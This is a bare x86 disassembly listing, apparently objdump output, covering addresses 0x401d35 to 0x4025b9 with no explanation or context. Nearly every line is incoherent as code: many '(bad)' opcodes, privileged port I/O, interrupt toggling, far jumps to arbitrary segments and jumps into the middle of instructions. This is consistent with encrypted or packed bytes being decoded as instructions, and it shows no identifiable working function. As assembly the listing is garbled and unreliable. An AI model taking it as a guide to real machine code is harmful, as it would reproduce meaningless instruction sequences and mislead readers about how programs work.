  401d35:	call   0xca4bf51d
  401d3a:	or     dl,bl
  401d3c:	repz loop 0x401d36
  401d3f:	loop   0x401cf7
  401d41:	lods   eax,DWORD PTR ds:[esi]
  401d42:	shr    DWORD PTR [ecx+ebx*8-0x1144851],cl
  401d49:	mov    edi,0xfffbfaf2
  401d4e:	out    dx,eax
  401d4f:	loope  0x401d4e
  401d51:	shl    esi,0xb
  401d54:	rcr    dl,cl
  401d56:	cli    
  401d57:	or     DWORD PTR [ebx],eax
  401d59:	in     al,dx
  401d5a:	fldz   
  401d5c:	add    eax,0xa4d1a8c7
  401d61:	(bad)  
  401d62:	mov    al,0xf7
  401d64:	mov    dl,0xca
  401d66:	mov    ch,0xbb
  401d68:	aad    0xc5
  401d6a:	lock jmp 0xc7f2:0xfcc3bbc3
  401d72:	add    bl,dl
  401d74:	retf   
  401d75:	fsubr  st,st(2)
  401d77:	loop   0x401d5a
  401d79:	aad    0xcc
  401d7b:	or     al,0xff
  401d7d:	loopne 0x401d5d
  401d7f:	test   esi,0xf3c9f4ca
  401d85:	call   0xfb12d585
  401d8a:	cli    
  401d8b:	loop   0x401d4c
  401d8d:	mov    bh,0xc0
  401d8f:	sar    edx,0xe4
  401d92:	jmp    0x401d8e
  401d94:	(bad)  
  401d96:	pop    es
  401d97:	mov    eax,0xcb04cf0d
  401d9d:	shr    BYTE PTR [ebp-0x371f1915],1
  401da3:	shr    edx,0xeb
  401da6:	mov    edx,0xf3cdf1de
  401dab:	out    dx,eax
  401dac:	shl    bl,cl
  401dae:	add    eax,ebx
  401db0:	rcr    eax,1
  401db2:	in     al,dx
  401db3:	mov    ebp,0xbefac1
  401db8:	sti    
  401db9:	push   cs
  401dba:	pmulhuw mm3,mm7
  401dbd:	lods   eax,DWORD PTR ds:[esi]
  401dbe:	test   eax,0xccc9eac8
  401dc3:	int3   
  401dc4:	mov    ebx,0xede8dad0
  401dc9:	repnz mov ebx,0x1f3ccd4
  401dcf:	loope  0x401dd1
  401dd1:	fild   WORD PTR ds:0xdffb09d4
  401dd7:	out    dx,eax
  401dd8:	std    
  401dd9:	fcomp  st(0)
  401ddb:	or     al,0xc4
  401ddd:	call   0xcc22e793
  401de2:	int3   
  401de3:	mov    ah,0xf0
  401de5:	loope  0x401dcc
  401de7:	in     al,dx
  401de8:	sti    
  401de9:	test   ah,0xee
  401dec:	fdiv   st,st(1)
  401dee:	aam    0xbd
  401df0:	aam    0xdc
  401df2:	fcmovnb st,st(7)
  401df4:	fld    st(2)
  401df6:	or     eax,DWORD PTR [ecx+eiz*8]
  401df9:	in     eax,dx
  401dfa:	stc    
  401dfb:	psrlq  mm1,mm0
  401dfe:	fisubr WORD PTR [edi-0x3e313e3f]
  401e04:	mov    al,0xe0
  401e06:	fcmovnbe st,st(5)
  401e08:	call   esp
  401e0a:	fsub   st(5),st
  401e0c:	ret    0xdde1
  401e0f:	rol    BYTE PTR [ebx],1
  401e11:	mov    ebp,0xebd7f1be
  401e16:	loopne 0x401ddc
  401e18:	into   
  401e19:	or     al,0xf
  401e1b:	rol    DWORD PTR [edx],cl
  401e1d:	stos   BYTE PTR es:[edi],al
  401e1e:	stos   BYTE PTR es:[edi],al
  401e1f:	mov    ebp,0xc7f7c9f5
  401e24:	out    dx,al
  401e25:	mov    ecx,0xc9f1f6f8
  401e2a:	mov    ecx,0xd7cfb8bc
  401e2f:	lock mov ah,0xf4
  401e32:	xlat   BYTE PTR ds:[ebx]
  401e33:	(bad)  
  401e34:	retf   
  401e35:	(bad)  
  401e37:	(bad)  
  401e39:	(bad)  
  401e3a:	out    dx,eax
  401e3b:	(bad)  
  401e3d:	call   0xd709e409
  401e42:	hlt    
  401e43:	mov    cl,0xcb
  401e45:	(bad)  
  401e46:	jmp    0xba151c3e
  401e4b:	mov    edx,0xf8d3e2fd
  401e50:	icebp  
  401e51:	mov    edi,0xd0e9dc04
  401e56:	push   es
  401e57:	jmp    0x538f446
  401e5c:	or     esi,ecx
  401e5e:	jmp    0xf7d1:0xe1d6adf1
  401e65:	call   0xfb371460
  401e6a:	aam    0xfa
  401e6c:	out    dx,al
  401e6d:	neg    ah
  401e6f:	rcr    dh,cl
  401e71:	add    edi,edi
  401e73:	(bad)  
  401e75:	or     ebx,eax
  401e77:	out    0x5,al
  401e79:	or     edx,edi
  401e7b:	out    dx,eax
  401e7c:	repz fistp QWORD PTR [eax-0x1a09081a]
  401e83:	jmp    0xd515195f
  401e88:	fst    st(6)
  401e8a:	fincstp 
  401e8c:	lock std 
  401e8e:	add    dl,dh
  401e90:	out    dx,al
  401e91:	(bad)  
  401e93:	aad    0xe1
  401e95:	(bad)  
  401e96:	jecxz  0x401e8d
  401e98:	out    0x1,eax
  401e9a:	in     al,dx
  401e9b:	or     ah,cl
  401e9d:	out    dx,eax
  401e9e:	(bad)  
  401ea0:	shl    BYTE PTR [ecx-0x5442e3a],cl
  401ea6:	out    0xd6,al
  401ea8:	sar    DWORD PTR [edi-0x1e0c072c],1
  401eae:	into   
  401eaf:	mov    edi,0xe0d6bcb4
  401eb4:	cmc    
  401eb5:	fcmove st,st(2)
  401eb7:	add    edi,edx
  401eb9:	call   0xba0d08a8
  401ebe:	mov    edi,0xd6e8e5bc
  401ec3:	cli    
  401ec4:	loop   0x401e86
  401ec6:	in     al,0xf0
  401ec8:	retf   
  401ec9:	int3   
  401eca:	les    eax,FWORD PTR [edx]
  401ecc:	mov    al,0xdf
  401ece:	iret   
  401ecf:	iret   
  401ed0:	rcl    bl,1
  401ed2:	ret    0xe5df
  401ed5:	aam    0xef
  401ed7:	test   DWORD PTR [eax],0xc8ffcf0e
  401edd:	ror    ah,1
  401edf:	shl    esi,1
  401ee1:	retf   
  401ee2:	retf   0xeaf7
  401ee5:	in     al,dx
  401ee6:	shl    eax,1
  401ee8:	leave  
  401ee9:	mov    esi,0xdfd5d5ff
  401eee:	add    al,bh
  401ef0:	shl    ch,0xf7
  401ef3:	loop   0x401ec7
  401ef5:	retf   0xe70b
  401ef8:	(bad)
  401efb:	in     eax,dx
  401efc:	jmp    0x401eef
  401efe:	out    dx,al
  401eff:	retf   0xb1af
  401f02:	xlat   BYTE PTR ds:[ebx]
  401f03:	test   eax,0xc9c4fbe4
  401f08:	icebp  
  401f09:	mov    ecx,0xd4c8cdc9
  401f0e:	cld    
  401f0f:	add    edi,eax
  401f11:	int3   
  401f12:	out    0xe5,eax
  401f14:	shl    edi,1
  401f16:	call   0xd019eeea
  401f1b:	call   0xbfeee026
  401f20:	lods   al,BYTE PTR ds:[esi]
  401f21:	jecxz  0x401f14
  401f23:	sti    
  401f24:	call   0xfc2fee0e
  401f29:	mov    ch,0xcb
  401f2b:	enter  0xb9e9,0xdf
  401f2f:	add    eax,ebx
  401f31:	cmc    
  401f32:	in     eax,0xf0
  401f34:	fdivr  st,st(7)
  401f36:	loope  0x401f3c
  401f38:	out    dx,eax
  401f39:	stc    
  401f3a:	pop    es
  401f3b:	int3   
  401f3c:	jmp    0xc3cc:0xe2f6c4e9
  401f43:	jmp    0xedb9:0xf3d2daf3
  401f4a:	aam    0xd2
  401f4c:	stc    
  401f4d:	loopne 0x401f0c
  401f4f:	cli    
  401f50:	aad    0x4
  401f52:	icebp  
  401f53:	shl    dl,cl
  401f55:	rol    BYTE PTR [esi],1
  401f57:	out    0xf,eax
  401f59:	hlt    
  401f5a:	fprem  
  401f5c:	ffreep st(6)
  401f5e:	loope  0x401f33
  401f60:	call   0xb827dc48
  401f65:	leave  
  401f66:	leave  
  401f67:	fistp  QWORD PTR [eax-0x6402806]
  401f6d:	mov    ebp,0xec03fed8
  401f72:	inc    BYTE PTR [esp+esi*8]
  401f75:	add    cl,cl
  401f77:	add    ch,bh
  401f79:	clc    
  401f7a:	push   es
  401f7b:	fcomi  st,st(1)
  401f7d:	in     eax,0xc2
  401f7f:	jecxz  0x401f77
  401f81:	aad    0xef
  401f83:	mov    bl,0xdb
  401f85:	aam    0xea
  401f87:	mov    ah,0xc8
  401f89:	fcmove st,st(2)
  401f8b:	repnz mov ah,0xd4
  401f8e:	(bad)  
  401f8f:	(bad)  
  401f91:	fadd   DWORD PTR [ecx]
  401f93:	std    
  401f94:	loopne 0x401f80
  401f96:	out    dx,eax
  401f97:	(bad)  
  401f98:	in     eax,dx
  401f99:	fsubr  st(1),st
  401f9b:	fucomp st(4)
  401f9d:	int    0xf1
  401f9f:	mov    edi,0xdae5d5a4
  401fa4:	sar    BYTE PTR [edx-0x20084f13],cl
  401faa:	in     al,dx
  401fab:	(bad)  
  401fad:	ret    
  401fae:	cli    
  401faf:	test   edi,0xd6cbe6e3
  401fb5:	leave  
  401fb6:	(bad)  [esi]
  401fb8:	loopne 0x401f87
  401fba:	iret   
  401fbb:	or     al,0xd8
  401fbd:	shl    cl,cl
  401fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fc0:	call   0xc110d1ad
  401fc5:	(bad)
  401fc8:	shr    edi,cl
  401fca:	leave  
  401fcb:	(bad)  
  401fcc:	hlt    
  401fcd:	enter  0xee,0xc0
  401fd1:	aad    0xdc
  401fd3:	fld    DWORD PTR [ecx]
  401fd5:	hlt    
  401fd6:	cmc    
  401fd7:	push   es
  401fd8:	idiv   bh
  401fda:	(bad)  
  401fdb:	out    dx,eax
  401fdc:	add    al,0xc4
  401fde:	repnz retf 0xe1d3
  401fe2:	leave  
  401fe3:	idiv   ecx
  401fe5:	test   ecx,0xbaeef4f9
  401feb:	(bad)  
  401fec:	repz mov edi,0xe6e7deef
  401ff2:	(bad)
  401ff5:	loope  0x401fc2
  401ff7:	jecxz  0x401fdd
  401ff9:	fucomip st,st(6)
  401ffb:	push   cs
  401ffc:	into   
  401ffd:	jmp    0x401fb2
  401fff:	test   al,0xa4
  402001:	scas   al,BYTE PTR es:[edi]
  402002:	mov    ah,0xc0
  402004:	mov    ebx,0xe4edd6e5
  402009:	std    
  40200a:	cmc    
  40200b:	jecxz  0x401fd9
  40200d:	cld    
  40200e:	in     al,dx
  40200f:	aam    0xe5
  402011:	aam    0xdc
  402013:	lock not bh
  402016:	pandn  mm7,mm5
  402019:	push   es
  40201a:	(bad)  
  40201b:	jmp    0xf2c0:0xbdf2cccc
  402022:	in     eax,dx
  402023:	in     al,dx
  402024:	loopne 0x401ffc
  402026:	int3   
  402027:	aad    0xf5
  402029:	fidivr DWORD PTR [eax-0x3e27361e]
  40202f:	int3   
  402030:	push   es
  402031:	mov    ebx,0x1dabcfb
  402036:	add    esp,ebx
  402038:	or     esp,esi
  40203a:	or     DWORD PTR [esi],ecx
  40203c:	jecxz  0x40200b
  40203e:	xlat   BYTE PTR ds:[ebx]
  40203f:	out    0xf7,eax
  402041:	(bad)  
  402042:	mov    cl,0xfb
  402044:	rcl    esp,cl
  402046:	in     al,0xf8
  402048:	aam    0xd1
  40204a:	shr    esp,1
  40204c:	repnz in eax,dx
  40204e:	div    ebx
  402050:	shr    ah,cl
  402052:	fsqrt  
  402054:	rcr    cl,1
  402056:	clc    
  402057:	rcr    ebp,0xe7
  40205a:	loopne 0x40202b
  40205c:	out    0xe9,eax
  40205e:	sar    DWORD PTR [esi-0x53091035],1
  402064:	shl    BYTE PTR [edx-0x2d140917],1
  40206a:	mov    ecx,0xf3d6d4d8
  40206f:	std    
  402070:	std    
  402071:	(bad)  
  402073:	stc    
  402074:	jmp    0x402046
  402076:	rol    BYTE PTR [ebx],0xc8
  402079:	cli    
  40207a:	jmp    0xcfef:0xe4c6d3e2
  402081:	mov    esp,0xc4caf0d5
  402086:	enter  0xcddf,0xf9
  40208a:	repnz jmp 0xecfc:0xfbfaf4c8
  402092:	out    0xf7,al
  402094:	fld    QWORD PTR ds:0x7f8fef4
  40209a:	pmaxsw mm7,mm4
  40209d:	in     al,dx
  40209e:	mov    ebp,0xf6d3f2bf
  4020a3:	div    al
  4020a5:	rcl    ch,1
  4020a7:	mov    cl,0xcd
  4020a9:	int3   
  4020aa:	aad    0xde
  4020ac:	iret   
  4020ad:	add    eax,esi
  4020af:	push   es
  4020b0:	push   es
  4020b1:	mov    esi,0xf7e5c4c0
  4020b6:	jmp    0xdf231aaa
  4020bb:	in     eax,0xed
  4020bd:	in     al,0xbd
  4020bf:	shl    ebx,cl
  4020c1:	mov    dl,0xf1
  4020c3:	cmc    
  4020c4:	not    ah
  4020c6:	aam    0xea
  4020c8:	shl    ebp,1
  4020ca:	les    edi,FWORD PTR [edi+edx*8-0xc410229]
  4020d1:	in     eax,dx
  4020d2:	rcr    ah,cl
  4020d4:	(bad)  
  4020d6:	add    DWORD PTR [edi],ecx
  4020d8:	into   
  4020d9:	add    cl,bh
  4020db:	in     eax,0xfa
  4020dd:	ret    
  4020de:	test   eax,0xd1c8cdd0
  4020e3:	(bad)  
  4020e4:	mov    bh,0xf6
  4020e6:	sar    cl,1
  4020e8:	(bad)  
  4020e9:	fcomip st,st(7)
  4020eb:	xlat   BYTE PTR ds:[ebx]
  4020ec:	idiv   cl
  4020ee:	add    edi,ecx
  4020f0:	ret    
  4020f1:	aad    0xc5
  4020f3:	in     al,0xd0
  4020f5:	jecxz  0x4020c1
  4020f7:	fld    QWORD PTR [esi]
  4020f9:	clc    
  4020fa:	ficom  WORD PTR [edx]
  4020fc:	retf   0xadb1
  4020ff:	ror    ah,cl
  402101:	leave  
  402102:	xlat   BYTE PTR ds:[ebx]
  402103:	int3   
  402104:	enter  0xd8da,0xd8
  402108:	retf   0xeeda
  40210b:	mov    ecx,0xc7b6ced6
  402110:	(bad)  
  402111:	test   DWORD PTR [edi],0xf9eafdd0
  402117:	clc    
  402118:	lds    eax,FWORD PTR [eax]
  40211a:	repz or BYTE PTR [ebx],al
  40211d:	icebp  
  40211e:	out    dx,al
  40211f:	test   eax,0xccdbe4d7
  402124:	loopne 0x402114
  402126:	(bad)  
  402127:	les    esi,FWORD PTR [eax-0xb273748]
  40212d:	shl    bl,cl
  40212f:	std    
  402130:	rcr    dh,cl
  402132:	(bad)  
  402133:	jmp    0xdad5:0xe4fef709
  40213a:	sti    
  40213b:	out    dx,eax
  40213c:	in     eax,dx
  40213d:	rol    ebp,1
  40213f:	jmp    0x402133
  402141:	stos   DWORD PTR es:[edi],eax
  402142:	into   
  402143:	fidiv  DWORD PTR [ecx-0x52d5149]
  402149:	iret   
  40214a:	(bad)  
  40214b:	in     al,dx
  40214c:	(bad)  
  40214d:	mov    edx,0xf3e7fef9
  402152:	loopne 0x402144
  402154:	fst    st(4)
  402156:	std    
  402157:	cli    
  402158:	(bad)  
  40215a:	out    dx,al
  40215b:	out    dx,eax
  40215c:	(bad)  
  40215e:	ror    edi,1
  402160:	fsubr  QWORD PTR [ebx-0x3a343f4f]
  402166:	int    0xcb
  402168:	fucom  st(4)
  40216a:	clc    
  40216b:	icebp  
  40216c:	jmp    0xe5fc:0xecdde2
  402173:	sar    dl,cl
  402175:	(bad)  
  402177:	out    dx,eax
  402178:	std    
  402179:	jmp    0xe2e0:0xaa010fcf
  402180:	loop   0x402176
  402182:	mov    ch,0xa9
  402184:	int3   
  402185:	loope  0x402156
  402187:	int    0xd9
  402189:	aam    0xca
  40218b:	fistp  QWORD PTR [edx-0x323d0a20]
  402191:	out    0xe4,al
  402193:	rcr    edi,1
  402195:	sar    al,1
  402197:	xlat   BYTE PTR ds:[ebx]
  402198:	or     al,BYTE PTR [edx]
  40219a:	or     ecx,esi
  40219c:	call   0xbdf7e593
  4021a1:	scas   al,BYTE PTR es:[edi]
  4021a2:	mov    ah,0xcc
  4021a4:	int    0xec
  4021a6:	scas   al,BYTE PTR es:[edi]
  4021a7:	div    ch
  4021a9:	cli    
  4021aa:	mov    ebx,0xc8c1f1de
  4021af:	cli    
  4021b0:	fdiv   st(1),st
  4021b2:	in     al,dx
  4021b3:	fld    st(2)
  4021b5:	retf   0xdfc4
  4021b8:	(bad)  
  4021ba:	sti    
  4021bb:	retf   0xe400
  4021be:	rcl    edx,0xad
  4021c1:	rol    esi,0xc2
  4021c4:	in     al,0xd7
  4021c6:	lock mov dh,0xf1
  4021c9:	repnz in al,0xb5
  4021cc:	ret    0xddd8
  4021cf:	neg    ch
  4021d1:	not    edi
  4021d3:	add    esi,esp
  4021d5:	pop    es
  4021d6:	fstp   st(6)
  4021d8:	cli    
  4021d9:	loop   0x4021b8
  4021db:	add    ebx,esi
  4021dd:	stos   DWORD PTR es:[edi],eax
  4021de:	out    0xd7,eax
  4021e0:	repz iret 
  4021e2:	jmp    0xfae7:0xb1e4b6ed
  4021e9:	in     al,dx
  4021ea:	les    esi,FWORD PTR [ebp+edx*8+0x7da01ba]
  4021f1:	shl    bh,cl
  4021f3:	add    ebx,ecx
  4021f5:	rol    cl,0x2
  4021f8:	clc    
  4021f9:	fisttp QWORD PTR [eax]
  4021fb:	into   
  4021fc:	or     eax,eax
  4021fe:	xlat   BYTE PTR ds:[ebx]
  4021ff:	enter  0xaded,0xef
  402203:	fcmovbe st,st(6)
  402205:	mov    ebx,0xf7f9e5f7
  40220a:	iret   
  40220b:	sar    DWORD PTR [edx-0x1246370f],1
  402211:	std    
  402212:	sar    dh,0xd0
  402215:	(bad)  
  402216:	jecxz  0x4021e7
  402218:	(bad)  [edx]
  40221a:	iret   
  40221b:	stc    
  40221c:	out    dx,al
  40221d:	lods   eax,DWORD PTR ds:[esi]
  40221e:	fdiv   st,st(2)
  402220:	loope  0x4021e8
  402222:	into   
  402223:	lods   al,BYTE PTR ds:[esi]
  402224:	mov    cl,0xe9
  402226:	aad    0xcd
  402228:	shl    bl,cl
  40222a:	out    dx,al
  40222b:	retf   
  40222c:	stc    
  40222d:	cld    
  40222e:	mov    edi,0xdef5c1df
  402233:	jecxz  0x4021f7
  402235:	cli    
  402236:	jmp    0x914fe34
  40223b:	out    0xc8,al
  40223d:	into   
  40223e:	test   eax,0xd4ccd6d2
  402243:	mov    ah,0xef
  402245:	mov    ah,0xf8
  402247:	mov    ecx,0xd6f1fdc8
  40224c:	loop   0x40221b
  40224e:	loope  0x402236
  402250:	mov    esp,0xe7e3c1f4
  402255:	jecxz  0x402262
  402257:	add    eax,0xe1e9e0fd
  40225c:	fadd   st,st(1)
  40225e:	shr    DWORD PTR [ecx+esi*4-0x452d2d32],cl
  402265:	repnz retf 0xcdc7
  402269:	enter  0xbee4,0xff
  40226d:	mov    edx,0xd5bffcf4
  402272:	out    0xd3,al
  402274:	add    al,0xfc
  402276:	xlat   BYTE PTR ds:[ebx]
  402277:	fiadd  WORD PTR ds:0xdd01f9c7
  40227d:	scas   al,BYTE PTR es:[edi]
  40227e:	mov    bl,0xbf
  402280:	test   al,0xb3
  402282:	mov    ah,0xf2
  402284:	retf   
  402285:	mov    cl,0xf4
  402287:	int3   
  402288:	cli    
  402289:	int3   
  40228a:	retf   0xd1b8
  40228d:	repnz loopne 0x40227f
  402290:	call   edi
  402292:	in     al,0xfa
  402294:	inc    ebp
  402296:	or     dh,ah
  402298:	cmc    
  402299:	inc    esp
  40229b:	sti    
  40229c:	(bad)  
  40229d:	jmp    0xe6c3:0xc0d2bea9
  4022a4:	in     al,dx
  4022a5:	repnz retf 
  4022a7:	retf   
  4022a8:	mov    ah,0xff
  4022aa:	leave  
  4022ab:	(bad)  
  4022ad:	out    dx,al
  4022ae:	cmc    
  4022af:	cld    
  4022b0:	in     eax,0xf0
  4022b2:	add    esi,eax
  4022b4:	pop    es
  4022b5:	sti    
  4022b6:	add    DWORD PTR ds:0x9ffe8f9,eax
  4022bc:	or     al,0xd8
  4022be:	rol    bl,1
  4022c0:	cmc    
  4022c1:	mov    cl,0xad
  4022c3:	ror    dl,0xf6
  4022c6:	into   
  4022c7:	leave  
  4022c8:	mov    edx,0xcfb5b8ff
  4022cd:	stc    
  4022ce:	cli    
  4022cf:	repz in eax,0xe7
  4022d2:	int3   
  4022d3:	fucom  st(0)
  4022d5:	sti    
  4022d6:	or     bh,al
  4022d8:	(bad)  
  4022d9:	(bad)  
  4022db:	ror    DWORD PTR [edi],cl
  4022dd:	jmp    0x4022d6
  4022df:	imul   DWORD PTR [ebp-0x15322831]
  4022e5:	aam    0xef
  4022e7:	repnz out dx,al
  4022e9:	(bad)  [esi-0x262d4015]
  4022ef:	f2xm1  
  4022f1:	lock (bad) 
  4022f3:	rol    ebp,cl
  4022f5:	(bad)  
  4022f7:	std    
  4022f8:	iret   
  4022f9:	out    dx,al
  4022fa:	ret    0xe8e3
  4022fd:	shr    ecx,1
  4022ff:	mov    cl,0xc3
  402301:	mov    cl,0xe1
  402303:	out    0xc5,eax
  402305:	fxch   st(4)
  402307:	shl    BYTE PTR [eax-0x32a0426],1
  40230d:	stc    
  40230e:	mov    dh,0xbc
  402310:	bnd ret 0xfcbc
  402314:	add    ecx,DWORD PTR [ebx]
  402316:	add    al,0xf8
  402318:	add    ebx,ebx
  40231a:	retf   0xc90c
  40231d:	loopne 0x4022f6
  40231f:	in     eax,dx
  402320:	(bad)  
  402321:	mov    dh,0xea
  402323:	mov    ch,0xb1
  402325:	shr    ecx,0xda
  402328:	stc    
  402329:	mov    eax,0xceddf2fb
  40232e:	fcom   st(6)
  402330:	ffreep st(3)
  402332:	ret    0xd8b9
  402335:	mov    al,0xa
  402338:	or     ebp,ecx
  40233a:	or     ecx,DWORD PTR [ebx]
  40233c:	sar    BYTE PTR [edx+edx*8-0xc481552],0xdb
  402344:	repz mov al,0xbb
  402347:	(bad)  
  402348:	in     eax,dx
  402349:	mov    bh,0xb2
  40234b:	std    
  40234c:	jmp    0xe1121b1a
  402351:	mov    esi,0x8d8dac5
  402356:	rcl    ch,0x5
  402359:	ffreep st(4)
  40235b:	or     eax,0xefc8ade9
  402360:	(bad)  
  402361:	leave  
  402362:	jmp    0x402348
  402364:	retf   0xb2f1
  402367:	clc    
  402368:	clc    
  402369:	jmp    0x7e2:0xc8d5c9ec
  402370:	idiv   DWORD PTR [esi-0x141f282a]
  402376:	or     ecx,DWORD PTR [eax]
  402378:	enter  0xeacd,0xc5
  40237c:	in     al,dx
  40237d:	(bad)  
  40237f:	test   al,0xc4
  402381:	loop   0x40235e
  402383:	mov    bl,0xf5
  402385:	sar    DWORD PTR [ecx-0x1b470b4b],0xd3
  40238c:	lock jmp 0xd634f38c
  402392:	rcl    edi,0xdd
  402395:	jecxz  0x402392
  402397:	sti    
  402398:	or     edi,ebp
  40239a:	into   
  40239b:	out    dx,al
  40239c:	add    al,0xad
  40239e:	out    dx,al
  40239f:	mov    edi,0xa9e9f7f0
  4023a4:	in     al,dx
  4023a5:	loope  0x40235e
  4023a7:	mov    dh,0xac
  4023a9:	fsubr  st,st(6)
  4023ab:	out    dx,al
  4023ac:	add    dh,ch
  4023ae:	mov    edi,0xdef6d5fb
  4023b3:	sar    ebx,0x4
  4023b6:	add    eax,0xf9f8f5ff
  4023bb:	(bad)  
  4023bd:	ret    0xcea9
  4023c0:	lods   al,BYTE PTR ds:[esi]
  4023c1:	aam    0xf1
  4023c3:	jmp    0x4023b0
  4023c5:	mov    bl,0xb4
  4023c7:	lods   eax,DWORD PTR ds:[esi]
  4023c8:	(bad)  
  4023c9:	(bad)  
  4023cb:	stc    
  4023cc:	(bad)  
  4023ce:	mov    edx,0xbafee0d2
  4023d3:	push   es
  4023d4:	loope  0x4023d3
  4023d6:	clc    
  4023d7:	ror    bh,0xa
  4023da:	pop    es
  4023db:	fsubp  st(6),st
  4023dd:	loop   0x40238c
  4023df:	test   al,0xc9
  4023e1:	ror    edx,cl
  4023e3:	iret   
  4023e4:	retf   0xaeaf
  4023e7:	cli    
  4023e8:	in     al,dx
  4023e9:	in     al,0xb2
  4023eb:	xlat   BYTE PTR ds:[ebx]
  4023ec:	cli    
  4023ed:	jecxz  0x4023e6
  4023ef:	(bad)  
  4023f0:	xlat   BYTE PTR ds:[ebx]
  4023f1:	mov    esi,0xfdc0f2eb
  4023f6:	(bad)  
  4023f7:	or     esp,ebp
  4023f9:	add    al,0xf8
  4023fb:	retf   
  4023fc:	out    0xd3,eax
  4023fe:	loope  0x4023c4
  402400:	iret   
  402401:	sar    DWORD PTR [ecx+ecx*8-0x44124d49],1
  402408:	out    dx,al
  402409:	jmp    0xff0f0fc3
  40240e:	jecxz  0x4023eb
  402410:	shl    ebx,cl
  402412:	stc    
  402413:	repz hlt 
  402415:	(bad)
  402418:	(bad)  
  402419:	fsubr  st,st(0)
  40241b:	ror    DWORD PTR [eax+edx*8],cl
  40241e:	loope  0x4023de
  402420:	(bad)
  402423:	mov    dl,0xe7
  402425:	in     al,0xe9
  402427:	(bad)  
  402428:	out    dx,eax
  402429:	std    
  40242a:	aad    0xcd
  40242c:	mov    esp,0x6d1f9fa
  402431:	repz fld QWORD PTR [ebx+eax*1]
  402435:	fimul  WORD PTR [ecx]
  402437:	out    0xc7,al
  402439:	fdivr  st,st(5)
  40243b:	out    0xde,al
  40243d:	out    0xe7,al
  40243f:	repz rcl ebp,0xbc
  402443:	(bad)  
  402444:	(bad)  
  402446:	enter  0xe9c7,0xb4
  40244a:	mov    esi,0xc1c2d8d4
  40244f:	(bad)  
  402450:	(bad)  
  402451:	loop   0x40242b
  402453:	cli    
  402454:	(bad)
  402457:	iret   
  402458:	or     BYTE PTR [ebx],cl
  40245a:	jmp    0x40243c
  40245c:	add    ecx,esp
  40245e:	shl    ah,1
  402460:	out    dx,al
  402461:	aad    0xc1
  402463:	in     eax,0xce
  402465:	leave  
  402466:	(bad)  
  402467:	call   0x3fadc59
  40246c:	add    ebp,esp
  40246e:	repnz int 0xda
  402471:	repnz sar al,0xf4
  402475:	out    0xf9,al
  402477:	(bad)  
  402478:	call   0xe124e96b
  40247d:	into   
  40247e:	retf   0xeecf
  402481:	mov    al,0xec
  402483:	jmp    0xd8ee:0xd8d8e5f2
  40248a:	(bad)  
  40248b:	leave  
  40248c:	ret    
  40248d:	hlt    
  40248e:	cld    
  40248f:	ret    
  402490:	ret    0xbe07
  402493:	ret    0xe509
  402496:	out    dx,eax
  402497:	add    ecx,ebx
  402499:	fstp   st(7)
  40249b:	iret   
  40249c:	int    0xb1
  40249e:	shl    bh,cl
  4024a0:	shr    edx,0xf4
  4024a3:	lds    edi,FWORD PTR [ebx-0x26080c0b]
  4024a9:	into   
  4024aa:	aad    0xbb
  4024ac:	shr    edi,1
  4024ae:	icebp  
  4024af:	lock int3 
  4024b1:	repnz rcr esi,0xc7
  4024b5:	mov    edi,0xcbf9e8fd
  4024ba:	clc    
  4024bb:	in     al,0x9
  4024bd:	lods   eax,DWORD PTR ds:[esi]
  4024be:	(bad)
  4024c1:	shl    cl,1
  4024c3:	fisubr DWORD PTR [esi+eiz*8-0x37104546]
  4024ca:	cli    
  4024cb:	rcl    ebp,cl
  4024cd:	mov    edx,0xf6ded0cf
  4024d2:	pop    es
  4024d3:	fstp   st(5)
  4024d5:	cli    
  4024d6:	pmaxub mm4,mm6
  4024d9:	fiadd  DWORD PTR [edx]
  4024db:	retf   
  4024dc:	adc    al,cl
  4024de:	call   0xe70de2a6
  4024e3:	mov    ch,0xda
  4024e5:	cli    
  4024e6:	out    dx,eax
  4024e7:	fistp  QWORD PTR [esi-0x314a1722]
  4024ed:	rcr    ebp,1
  4024ef:	mov    ch,0x2
  4024f1:	sar    ah,cl
  4024f3:	or     cl,bl
  4024f5:	retf   
  4024f6:	add    dl,dh
  4024f8:	loop   0x4024ee
  4024fa:	in     eax,dx
  4024fb:	retf   
  4024fc:	fsubr  st(2),st
  4024fe:	rcr    ebp,cl
  402500:	in     al,0xf4
  402502:	(bad)  
  402503:	out    dx,eax
  402504:	in     al,0xdb
  402506:	(bad)
  402509:	retf   0xcdf7
  40250c:	shl    al,cl
  40250e:	out    0xef,eax
  402510:	fiadd  WORD PTR ds:0xbfb8d9c3
  402516:	test   esi,0xdd0adf00
  40251c:	out    0xbe,eax
  40251e:	loopne 0x4024d3
  402520:	leave  
  402521:	jmp    0xd9f3:0xf3b5b0ad
  402528:	retf   
  402529:	mov    edi,0xbcecf0dc
  40252e:	loope  0x402510
  402530:	std    
  402531:	add    ebx,edi
  402533:	(bad)  
  402535:	mov    edi,0xead9f5d8
  40253a:	fucomp st(5)
  40253c:	repz lock loop 0x40252e
  402540:	not    dh
  402542:	call   0xcc1b1542
  402547:	(bad)  [edx+ebp*8-0x52f240d]
  40254e:	loope  0x402508
  402550:	(bad)  
  402552:	rol    ecx,cl
  402554:	ror    edx,1
  402556:	add    eax,0xe1e6e3e3
  40255b:	lds    ecx,FWORD PTR [edx]
  40255d:	mov    esp,0xb5c6b1df
  402562:	lods   eax,DWORD PTR ds:[esi]
  402563:	fndisi(8087 only) 
  402565:	xlat   BYTE PTR ds:[ebx]
  402566:	fxtract 
  402568:	lods   al,BYTE PTR ds:[esi]
  402569:	fucomp st(4)
  40256b:	repnz int3 
  40256d:	into   
  40256e:	mov    esi,0xfbe2f7f2
  402573:	fadd   QWORD PTR [edi]
  402575:	stc    
  402576:	fiadd  WORD PTR [eax]
  402578:	bswap  eax
  40257a:	cli    
  40257b:	fimul  WORD PTR [edx]
  40257d:	mov    edi,0xf6d2e1f3
  402582:	jecxz  0x402572
  402584:	mov    ah,0xfb
  402586:	div    edi
  402588:	mov    ch,0xff
  40258a:	mov    ecx,0xeebcd7ff
  40258f:	fiadd  DWORD PTR [ebx]
  402591:	loopne 0x402563
  402593:	in     eax,0xd5
  402595:	add    ch,dl
  402597:	fst    st(5)
  402599:	dec    DWORD PTR ds:0xc5b90beb
  40259f:	shr    BYTE PTR [edi-0xd394f11],0xf6
  4025a6:	mov    dl,0xde
  4025a8:	out    0xb7,al
  4025aa:	aam    0xff
  4025ac:	leave  
  4025ad:	mov    ebp,0x5debdcd
  4025b2:	fadd   st,st(0)
  4025b4:	(bad)  
  4025b6:	leave  
  4025b7:	add    edi,edi
  4025b9:	add    dh,ah
